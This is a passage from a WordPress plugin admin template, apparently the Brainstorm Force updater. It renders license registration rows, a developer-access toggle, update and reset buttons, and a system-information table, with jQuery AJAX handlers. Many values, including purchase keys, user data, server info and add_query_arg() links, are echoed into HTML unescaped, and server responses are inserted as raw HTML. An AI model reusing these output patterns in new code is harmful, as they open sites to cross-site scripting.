								           value="<?php echo $purchase_key ?>" <?php echo $readonly ?>/>
								<?php endif ?>
								</td>
								<td>
									<?php if($status !== 'registered') : ?>
                                            		<input type="button" class="button button-primary bsf-submit-button" value="Register" data-row-id="<?php echo $row_id ?>" <?php echo $common_data; ?>/>
                                            		<a href="<?php echo $purchase_url; ?>" target="_blank" class="bsf-purchase-link" data-row-id="<?php echo $row_id ?>" />Buy License</a> <span class="spinner bsf-spinner"></span>
                                               	<?php else : ?>
                                                	<input type="button" class="button bsf-submit-button-deregister" value="De-register" data-row-id="<?php echo $row_id ?>" <?php echo $common_data; ?>/> <span class="spinner bsf-spinner"></span>
                                                <?php endif; ?>
								</td>
							</tr>
							<?php
							$count ++;
						endforeach;
					endif;

					if ( ! empty( $bsf_themes ) ) :

						foreach ( $bsf_themes as $theme => $theme_data ) :

							//echo '<pre>';
							//print_r($theme_data);
							//echo '</pre>';
							$readonly  = '';

							if ( isset( $theme_data['product_info'] ) ) {
								$info = $theme_data['product_info'];
							} else {
								continue;
							}
							$status = ( isset( $info['status'] ) ) ? $info['status'] : '';

							$bsf_username  = ( isset( $info['bsf_username'] ) ) ? $info['bsf_username'] : $bsf_user_name;
							$bsf_useremail = ( isset( $info['bsf_useremail'] ) ) ? $info['bsf_useremail'] : $bsf_user_email;
							$purchase_key  = ( isset( $info['purchase_key'] ) ) ? $info['purchase_key'] : '';
							$type          = ( isset( $info['type'] ) ) ? $info['type'] : 'theme';
							$template      = ( isset( $info['template'] ) ) ? $info['template'] : $plugin;
							$id            = ( isset( $info['id'] ) ) ? $info['id'] : '';
							$purchase_url  = ( isset( $info['purchase_url'] ) ) ? $info['purchase_url'] : 'javascript:void(0)';

							if ( $request_product_id != '' ) {
								$init_single_product_show = true;
							} else {
								$init_single_product_show = false;
							}

							if ( $init_single_product_show && $request_product_id !== $id ) {
								continue;
							}

							$constant = 'BSF_REMOVE_' . $id . '_FROM_REGISTRATION';
							if ( defined( $constant ) && ( $constant == 'true' || $constant == true ) ) {
								continue;
							}

							$version = bsf_get_current_version( $template, $type );
							$name    = bsf_get_current_name( $template, $type );

							$step = ( isset( $theme_data['step'] ) && $theme_data['step'] != '' ) ? $theme_data['step'] : 'step-product-registration';

							$common_data = ' data-product-id="' . $id . '" ';
							$common_data .= ' data-bsf_username="' . $bsf_username . '" ';
							$common_data .= ' data-bsf_useremail="' . $bsf_useremail . '" ';
							$common_data .= ' data-product-type="' . $type . '" ';
							$common_data .= ' data-template="' . $template . '" ';
							$common_data .= ' data-version="' . $version . '" ';
							$common_data .= ' data-step="' . $step . '" ';
							$common_data .= ' data-product-name="' . $name . '" ';

							$mod       = ( $count % 2 );
							$alternate = ( $mod ) ? 'alternate' : '';
							$row_id    = 'bsf-row-' . $count;

							if ( $status === 'registered' ) {
								$readonly = ' readonly="readonly" ';
								$common_data .= ' data-action="bsf_deregister_product" ';
								$registered_licence ++;
							} else {
								$common_data .= ' data-action="bsf_register_product" ';
							}

							if ( $type === 'theme' ) {
								$is_product_theme = true;
							}
							?>
							<tr id="<?php echo $row_id ?>" class="<?php echo $alternate . ' ' . $status ?>">
								<td><?php echo $name ?></td>
								<td><?php echo $version ?></td>
								<td>
								<?php if ( $purchase_key !== '' && $status === 'registered' ) : ?>
									Purchase Verified
								<?php else: ?>
									<input type="text" class="bsf-form-input" name="purchase_key" spellcheck="false"
								           data-required="true"
								           value="<?php echo $purchase_key ?>" <?php echo $readonly ?>/>
								<?php endif ?>
								</td>
								<td>
									<?php if($status !== 'registered') : ?>
                                            		<input type="button" class="button button-primary bsf-submit-button" value="Register" data-row-id="<?php echo $row_id ?>" <?php echo $common_data; ?>/>
                                            		<a href="<?php echo $purchase_url; ?>" target="_blank" class="bsf-purchase-link" data-row-id="<?php echo $row_id ?>" />Buy License</a> <span class="spinner bsf-spinner"></span>
                                               	<?php else : ?>
                                                	<input type="button" class="button bsf-submit-button-deregister" value="De-register" data-row-id="<?php echo $row_id ?>" <?php echo $common_data; ?>/> <span class="spinner bsf-spinner"></span>
                                                <?php endif; ?>
								</td>
							</tr>
							<?php
							$count ++;
						endforeach;
					endif;
					?>
					</tbody>
				</table>
				<div class="bsf-listing-cta">
					<a href="https://support.brainstormforce.com/license-registration-faqs/" target="_blank">Questions?
						Having Issues?</a>
				</div>
			</div>

		</div>
		<!-- bsf-licence-tab -->
		<div id="bsf-help" class="bsf-tab">
			<div class="inner">
				<div class="bsf-row">
					<div class="bsf-column">
						<div class="bsf-column-inner">
							<h2>Developer Access</h2>
							<span class="bsf-span"><?php echo __( 'Enable Developer access', 'bsf' ) ?>
								,<br/><?php echo __( 'Read more about developer access ', 'bsf' ); ?><a
									href="<?php echo $bsf_support_url . 'license-registration-faqs/#developer-access' ?>"
									target="_blank"><?php echo __( 'here', 'bsf' ) ?></a></span>

							<form action="" class="bsf-cp-dev-access" method="post">
								<?php
								$title = '';
								if ( $registered_licence > 0 ) {
									$disabled = '';
								} else {
									$disabled = 'disabled="disabled"';
									$title    = __( 'Activate your license to enable!', 'bsf' );
									update_option( 'developer_access', false );
								}

								$developer_access = get_option( 'developer_access' );

								if ( $developer_access ) {
									$button_text = 'Revoke developer access';
									$action      = 'revoke';
								} else {
									$button_text = 'Allow developer access';
									$action      = 'grant';
								}
								?>
								<input type="hidden" name="bsf-developer-access-action" value="<?php echo $action ?>"/>
								<input type="submit" class="button-primary bsf-access-<?php echo $action ?>-button"
								       name="bsf-developer-access" value="<?php echo $button_text ?>"
								       title="<?php echo $title ?>" <?php echo $disabled ?>/>
							</form>
						</div>
					</div>
					<div class="bsf-column">
						<div class="bsf-column-inner">
							<h2>Force Check Updates</h2>
							<span
								class="bsf-span"><?php printf( __( "Check if there are updates available of plugins by %s.", 'bsf' ), BSF_UPDATER_FULLNAME ); ?></span>
							<?php
								$reset_url = add_query_arg( 'force-check-update', '' );
							?>
							<a class="button-primary bsf-cp-update-btn"
							   href="<?php echo $reset_url ?>"><?php echo __( 'Check Updates Now', 'bsf' ) ?></a>
						</div>
					</div>
					<div class="bsf-column">
						<div class="bsf-column-inner">
							<h2>Request Support</h2>
							<?php global $bsf_support_url; 
							$request_support = apply_filters( 'agency_updater_request_support', $bsf_support_url . 'request-support/' );
							?>
							<span
								class="bsf-span"><?php echo __( 'Having any trouble using our products? Head to our support center to get your issues resolved.', 'bsf' ); ?></span>
							<a class="button-primary bsf-cp-support-btn"
							   href="<?php echo $request_support; ?>"
							   target="_blank"><?php echo __( 'Request Support', 'bsf' ) ?></a>
						</div>
					</div>
				</div>
			</div>
		</div>
		<?php if ( $author ) : ?>
			<div id="bsf-author" class="bsf-tab <?php echo ( $tab == 'author' ) ? 'bsf-tab-active' : '' ?>">
				<div class="inner">
					<div class="bsf-row">
						<div class="bsf-column">
							<div class="bsf-column-inner">
								<?php

								$reset_url = bsf_registration_page_url( '&reset-bsf-users' );
								?>
								<h2>Reset <?php echo BSF_UPDATER_SHORTNAME; ?> Registration</h2>
								<span class="bsf-span">
									Reset all the <?php echo BSF_UPDATER_SHORTNAME; ?> registration data?
								</span>
								<a class="button-primary"
								   href="<?php echo $reset_url ?>"><?php printf( __( "Reset %s Registration", 'bsf' ), BSF_UPDATER_SHORTNAME ) ?></a>
							</div>
						</div>
						<div class="bsf-column">
							<div class="bsf-column-inner">
								<?php
									$url = add_query_arg( 'remove-bundled-products', '' );
								?>
								<h2>Reset Bundled Products data</h2>
								<span class="bsf-span">
									Reload the bundled products data from <?php echo BSF_UPDATER_SHORTNAME; ?>'s Servers?
								</span>
								<a class="button-primary"
								   href="<?php echo $url ?>"><?php echo __( 'Check Bundled Products', 'bsf' ) ?></a>
							</div>
						</div>

						<div class="bsf-column">
							<div class="bsf-column-inner">
								<div class="brainstorm-updater-switch">
									<?php echo brainstorm_switch( 'brainstorm_menu', false ); ?>
								</div>
								<h2><?php printf( __( "%s Menu in Settings?", 'bsf' ), BSF_UPDATER_SHORTNAME ); ?></h2>
								<span class="bsf-span">
									<?php printf( __( "Move the %s menu to WordPress settings?", 'bsf' ), BSF_UPDATER_SHORTNAME ); ?>
									</span>
								<a class="button-primary brainstorm_menu"
								   href="#"><?php echo __( 'Update', 'bsf' ) ?></a>
								<span class="spinner bsf-spinner"></span>

							</div>
						</div>
					</div>
				</div>
			</div><!-- bsf-author-tab -->
		<?php endif; ?>
		<div id="bsf-system" class="bsf-tab">
			<div class="inner">
				<table class="wp-list-table widefat fixed bsf-sys-info">
					<tbody>
					<tr class="alternate">
						<th colspan="2"><?php echo __( 'WordPress Environment', 'bsf' ); ?></th>
					</tr>
					<tr>
						<td>Home URL</td>
						<td><?php echo site_url(); ?></td>
					</tr>
					<tr>
						<td>Site URL</td>
						<td><?php echo site_url(); ?></td>
					</tr>
					<tr>
						<?php global $wp_version ?>
						<td>WP Version</td>
						<td><?php echo $wp_version; ?></td>
					</tr>
					<tr>
						<td>Multisite</td>
						<td><?php echo ( is_multisite() ) ? 'Yes' : 'No'; ?></td>
					</tr>
					<?php
					$limit = (int) ini_get( 'memory_limit' );
					$usage = function_exists( 'memory_get_usage' ) ? round( memory_get_usage() / 1024 / 1024, 2 ) : 0;
					?>
					<tr>
						<td>Memory Usage</td>
						<td>
							<?php echo $usage ?>
							MB of
							<?php echo $limit ?>
							MB
						</td>
					</tr>
					<tr>
						<td>WP Memory Limit</td>
						<td>
							<?php echo WP_MEMORY_LIMIT ?>
						</td>
					</tr>
					<tr>
						<td>WP Debug</td>
						<td><?php echo ( WP_DEBUG ) ? 'Enabled' : 'Disabled'; ?></td>
					</tr>
					<tr>
						<td>WP Lang</td>
						<td><?php echo $currentlang = get_bloginfo( 'language' ); ?></td>
					</tr>
					<tr>
						<td>WP Uploads Directory</td>
						<td>
							<?php
							$wp_up = wp_upload_dir();
							echo ( is_writable( $wp_up['basedir'] ) ) ? 'Writable' : 'Readable';
							?>
						</td>
					</tr>
					<tr>
						<td>BSF Updater Path</td>
						<td>
							<?php global $bsf_core_version; ?>
							<?php echo '(v' . $bsf_core_version . ') ' . BSF_UPDATER_PATH; ?>
						</td>
					</tr>
					<?php if ( defined( 'WPB_VC_VERSION' ) ) : ?>
						<tr>
							<td>vc_shortcode_output Filter</td>
							<td>
								<?php echo ( has_filter( 'vc_shortcode_output' ) ) ? 'Available' : 'Not Available'; ?>
							</td>
						</tr>
					<?php endif; ?>
					<?php
					$mix           = array_merge( $bsf_product_plugins, $bsf_product_themes );
					$temp_constant = '';
					if ( ! empty( $mix ) ) :
						foreach ( $mix as $key => $product ) :
							$constant = strtoupper( str_replace( '-', '_', $product['id'] ) );
							$constant = 'BSF_' . $constant . '_CHECK_UPDATES';
							if ( defined( $constant ) && ( constant( $constant ) === 'false' || constant( $constant ) === false ) ) {
								$temp_constant .= $constant . '<br/>';
								continue;
							}
						endforeach;
					endif;
					if ( defined( 'BSF_CHECK_PRODUCT_UPDATES' ) && BSF_CHECK_PRODUCT_UPDATES == false ) {
						$temp_constant .= 'BSF_CHECK_PRODUCT_UPDATES';
					}
					if ( $temp_constant != '' ) {
						if ( ! defined( 'BSF_RESTRICTED_UPDATES' ) ) {
							define( 'BSF_RESTRICTED_UPDATES', $temp_constant );
						}
					}
					?>
					<?php if ( defined( 'BSF_RESTRICTED_UPDATES' ) ) : ?>
						<tr>
							<td>Restrited Updates Filter</td>
							<td>
								<?php echo BSF_RESTRICTED_UPDATES; ?>
							</td>
						</tr>
					<?php endif; ?>
					</tbody>
				</table>
				<table class="wp-list-table widefat fixed bsf-sys-info">
					<tbody>
					<tr class="alternate">
						<th colspan="2"><?php echo __( 'Server Environment', 'bsf' ); ?></th>
					</tr>
					<tr>
						<td>Server Info</td>
						<td><?php echo $_SERVER['SERVER_SOFTWARE'] ?></td>
					</tr>
					<tr>
						<td>PHP Version</td>
						<td><?php echo ( function_exists( 'phpversion' ) ) ? phpversion() : 'Not sure'; ?></td>
					</tr>
					<tr>
						<td>MYSQL Version</td>
						<td><?php 
						global $wpdb;
						echo $wpdb->db_version(); ?></td>
					</tr>
					<tr>
						<td>PHP Post Max Size</td>
						<td><?php echo ini_get( 'post_max_size' ); ?></td>
					</tr>
					<tr>
						<td>PHP Max Execution Time</td>
						<td><?php echo ini_get( 'max_execution_time' ); ?> Seconds</td>
					</tr>
					<tr>
						<td>PHP Max Input Vars</td>
						<td><?php echo ini_get( 'max_input_vars' ); ?></td>
					</tr>
					<tr>
						<td>Max Upload Size</td>
						<td><?php echo ini_get( "upload_max_filesize" ); ?></td>
					</tr>
					<tr>
						<td>Default Time Zone</td>
						<td>
							<?php
							if ( date_default_timezone_get() ) {
								echo date_default_timezone_get();
							}
							if ( ini_get( 'date.timezone' ) ) {
								echo ' ' . ini_get( 'date.timezone' );
							}
							?>
						</td>
					</tr>
					<tr class="<?php echo ( ! function_exists( 'curl_version' ) ) ? 'bsf-alert' : ''; ?>">
						<td>cURL</td>
						<td>
							<?php
							if ( function_exists( 'curl_version' ) ) {
								$curl_info = curl_version();
								echo $curl_info['version'];
							} else {
								echo 'Not Enabled';
							}
							?>
						</td>
					</tr>
					<tr class="<?php echo ( ! function_exists( 'curl_version' ) ) ? 'bsf-alert' : ''; ?>">
						<td>SimpleXML</td>
						<td>
							<?php
							if ( extension_loaded( 'simplexml' ) ) {
								echo "All good, extension is installed";
							} else {
								echo "Oops! extension not installed, Icon Manager will not work";
							}
							?>
						</td>
					</tr>
					</tbody>
				</table>
				<table class="wp-list-table widefat fixed bsf-sys-info">
					<tbody>
					<tr class="alternate">
						<th colspan="2"><?php echo __( 'Theme Information', 'bsf' ); ?></th>
					</tr>
					<?php $theme_data = wp_get_theme(); ?>
					<tr>
						<td>Name</td>
						<td><?php echo $theme_data->Name ?></td>
					</tr>
					<tr>
						<td>Version</td>
						<td><?php echo $theme_data->Version ?></td>
					</tr>
					<tr>
						<td>Author</td>
						<td><a href="<?php echo $theme_data->ThemeURI ?>"><?php echo $theme_data->Author ?></a></td>
					</tr>
					</tbody>
				</table>
				<table class="wp-list-table widefat fixed bsf-sys-info bsf-table-active-plugin">
					<tbody>
					<tr class="alternate">
						<th colspan="4"><?php echo __( 'Installed Plugins', 'bsf' ); ?></th>
					</tr>
					<?php
					$plugins = get_plugins();
					asort( $plugins );
					foreach ( $plugins as $plugin_file => $plugin_data ) {
						?>
						<tr>
							<td><?php echo str_pad( $plugin_data['Title'], 30 ); ?></td>
							<td>
								<?php
								if ( is_plugin_active( $plugin_file ) ) {
									echo str_pad( 'Active', 10 );
								} else {
									echo str_pad( 'Inactive', 10 );
								}
								?>
							</td>
							<td><?php echo str_pad( $plugin_data['Version'], 10 ) ?></td>
							<td><?php echo $plugin_data['Author'] ?></td>
						</tr>
						<?php
					}
					?>
					</tbody>
				</table>
			</div>
		</div>
		<!-- bsf-system-tab -->
	</div>
</div>
<script type="text/javascript">
	(function ($) {
		"use strict";
		$(document).ready(function () {


			$('body').on('click', '.brainstorm_menu.button-primary', function (event) {
				event.preventDefault();
				var spinner = jQuery( this ).siblings('.bsf-spinner');
				spinner.toggleClass('bsf-spinner-show');
				var val = jQuery('.brainstorm_menu.bsf-switch-input').val();

				jQuery.ajax({
					url: ajaxurl,
					type: 'POST',
					dataType: 'JSON',
					data: {
						action: 'update_bsf_core_options',
						option: 'brainstorm_menu',
						value: val
					},
				})
					.done(function (result) {
						if ( window.location.href !== result.redirect ) {
							window.location.replace(result.redirect);
						}
						spinner.toggleClass('bsf-spinner-show');
					})
					.fail(function (e) {
						console.log("error");
						console.log( e );
						spinner.toggleClass('bsf-spinner-show');
					});

			});

			$('body').on('click', '.bsf-submit-button', function () {
				var row_id = $(this).attr('data-row-id');
				var $row = $('#' + row_id);

				var errors = 0;

				$row.find('.bsf-spinner').toggleClass('bsf-spinner-show');

				var purchase_key = $row.find('input[name="purchase_key"]').val();

				var product_id = $(this).attr('data-product-id');
				var username = $(this).attr('data-bsf_username');
				var useremail = $(this).attr('data-bsf_useremail');
				var product_type = $(this).attr('data-product-type');
				var template = $(this).attr('data-template');
				var version = $(this).attr('data-version');
				var step = $(this).attr('data-step');
				var product_name = $(this).attr('data-product-name');

				var action = $(this).attr('data-action');

				var admin_url = '<?php echo (is_multisite()) ? rtrim(network_admin_url(),'/') : rtrim(admin_url(),'/'); ?>';

				$row.find('.bsf-form-input').each(function (i, input) {
					var type = $(input).attr('type');
					var required = $(input).attr('data-required');
					if (required === 'true' || required === true) {
						if (type === 'text') {
							$(input).removeClass('bsf-pr-input-required');
							if ($(input).val() === '') {
								$(input).addClass('bsf-pr-input-required');
								errors++;
							}
						}
					}
				});
				if (errors > 0) {
					$row.find('.bsf-spinner').toggleClass('bsf-spinner-show');
					return false;
				}

				var data = {
					action: action,
					bsf_username: username,
					bsf_useremail: useremail,
					purchase_key: purchase_key,
					type: product_type,
					id: product_id,
					product: template,
					version: version,
					step: step,
					product_name: product_name
				};

				$.post(ajaxurl, data, function (response) {
					console.log(response);
					//return false;
					var result = $.parseJSON(response);
					console.log(result);

					if (typeof result === 'undefined' || result === null)
						return false;

					//result.proceed = true;

					if (result.proceed === 'false' || result.proceed === false) {
						var html = '';
						if (typeof result.response.title !== 'undefined')
							html += '<h2><span class="dashicons dashicons-info" style="transform: scale(-1);-web-kit-transform: scale(-1);margin-right: 10px;color: rgb(244, 0, 0);  font-size: 25px;"></span>' + result.response.title + '</h2>';
						if (typeof result.response.message_html !== 'undefined')
							html += '<div class="bsf-popup-message-inner-html">' + result.response.message_html + '</div>';
						$('.bsf-popup-message-inner').html(html);
						$('.bsf-popup, .bsf-popup-message').fadeIn(300);
					}
					else if (result.proceed === 'true' || result.proceed === true) {
						var html = '';
						if (typeof result.response.title !== 'undefined')
							html += '<h2><span class="dashicons dashicons-yes" style="margin-right: 10px;color: rgb(0, 213, 0);  font-size: 25px;"></span>' + result.response.title + '</h2>';
						if (typeof result.response.message_html !== 'undefined')
							html += '<div class="bsf-popup-message-inner-html">' + result.response.message_html + '</div>';
						$('.bsf-popup-message-inner').html(html);
						$('.bsf-popup, .bsf-popup-message').fadeIn(300);
						if (typeof result.after_registration_action !== 'undefined' && result.after_registration_action !== '')
							if (result.after_registration_action == 'admin.php?page=bsf-extensions') {
								window.location.href = admin_url + '/' + result.after_registration_action + '?product_id=10395942';
							} else {
								window.location.href = admin_url + '/' + result.after_registration_action;
							}
						else
							location.reload();
					}
					$row.find('.bsf-spinner').toggleClass('bsf-spinner-show');
				});
			}); //end of submit button

			$('body').on('click', '.bsf-submit-button-deregister', function () {
				var row_id = $(this).attr('data-row-id');
				var $row = $('#' + row_id);

				var errors = 0;

				$row.find('.bsf-spinner').toggleClass('bsf-spinner-show');

				var purchase_key = $row.find('input[name="purchase_key"]').val();
				var bsf_username = $(this).attr('data-bsf_username');
				var bsf_useremail = $(this).attr('data-bsf_useremail');
				var product_id = $(this).attr('data-product-id');
				var product_type = $(this).attr('data-product-type');
				var template = $(this).attr('data-template');
				var version = $(this).attr('data-version');
				var name = $(this).attr('data-product-name');

				var action = $(this).attr('data-action');

				var data = {
					action: action,
					purchase_key: purchase_key,
					bsf_username: bsf_username,
					bsf_useremail: bsf_useremail,
					type: product_type,
					id: product_id,
					product: template,
					version: version,
					product_name: name
				};

				console.log(data);

				$.post(ajaxurl, data, function (response) {
					//console.log($.parseJSON(response));
					//return false;
					console.log(response);
					//return false;
					var result = $.parseJSON(response);
					var html = '';
					if (typeof result.response.title !== 'undefined')
						html += '<h2><span class="dashicons dashicons-yes" style="margin-right: 10px;color: rgb(0, 213, 0);  font-size: 25px;"></span>' + result.response.title + '</h2>';
					if (typeof result.response.message_html !== 'undefined')
						html += '<div class="bsf-popup-message-inner-html">' + result.response.message_html + '</div>';
					$('.bsf-popup-message-inner').html(html);
					$('.bsf-popup, .bsf-popup-message').fadeIn(300);
					if (result.proceed === 'true' || result.proceed === true) {
						//setTimeout(function(){
						location.reload();
						//},2000);
					}
				});

			}); // end of de-registering licence

			$('body').on('click', '.nav-tab', function (event) {
				//event.preventDefault();
				$('.nav-tab').removeClass('nav-tab-active');
				$(this).addClass('nav-tab-active');
				var tab = $(this).attr('href');
				$('.bsf-tab').fadeOut(200);
				setTimeout(function () {
					$(tab).fadeIn(200);
				}, 200);
			}); // end of tabs functionality
		});
	})(jQuery);
</script>